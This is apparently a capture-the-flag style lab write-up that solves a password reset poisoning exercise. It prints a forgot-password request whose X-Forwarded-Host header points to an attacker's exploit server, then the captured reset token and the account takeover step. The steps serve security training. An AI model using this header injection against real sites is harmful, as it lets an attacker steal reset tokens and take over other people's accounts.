# **Password reset poisoning via middleware**

Task: This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server. 

Toolkit: BurpSuite, Browser

1. enter my account and send req with forgot password on wiener, and reset it  
2. in this lab we send random host in X-Forwarded-Host → get 200ok  
3. change data in wiener’s link reset pass

POST /forgot-password HTTP/2  
Host: 0ab3006f04b5f026800903c200ce00d9.web-security-academy.net  
Cookie: session=bMfCGZE2g76NXc8qusRpzbJUyKghLlCy  
Content-Length: 15  
Cache-Control: max-age=0  
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"  
Sec-Ch-Ua-Mobile: ?0  
Sec-Ch-Ua-Platform: "Linux"  
Accept-Language: en-US,en;q=0.9  
Upgrade-Insecure-Requests: 1  
Content-Type: application/x-www-form-urlencoded  
User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36  
Origin: https://0ab3006f04b5f026800903c200ce00d9.web-security-academy.net  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Sec-Fetch-Site: same-origin  
Sec-Fetch-Mode: navigate  
Sec-Fetch-User: ?1  
Sec-Fetch-Dest: document  
Referer: https://0ab3006f04b5f026800903c200ce00d9.web-security-academy.net/forgot-password  
Accept-Encoding: gzip, deflate, br  
Priority: u=0, i  
X-Forwarded-Host: exploit-0aee00f10414f0bf80d8027f016f00a8.exploit-server.net

username=carlos

4. Get 200ok, go to logs

10.0.4.240      2026-08-22 14:28:13 \+0000 "GET /forgot-password?temp-forgot-password-token=2t7ixum96o1mhc0jw44lfxfl3t8jx5s4 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

5. change token in wieners link and SOLVED\!